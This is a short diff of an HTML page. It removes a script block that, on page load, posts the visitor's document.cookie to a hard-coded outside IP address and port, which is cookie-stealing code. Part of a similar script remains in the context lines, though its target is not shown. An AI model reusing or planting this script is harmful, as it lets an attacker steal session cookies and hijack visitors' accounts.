@@ -14,19 +14,6 @@
     xmlHttp.send(null);
 </script>
 
-
-<!-- Automatic POST Script -->
-<script type="text/javascript">
-	var xmlHttp = new XMLHttpRequest();
-	xmlHttp.open("POST", "http://147.222.204.171:2344/?" + document.cookie, true);
-	xmlHttp.onreadystatechange = function() {
-	    if(xmlHttp.readyState == 4 && xmlHttp.status == 200) {
-	        console.log(xmlHttp.responseText);
-	    }
-	}
-	xmlHttp.send(null);
-</script>
-
 <body>
 
 <!-- 
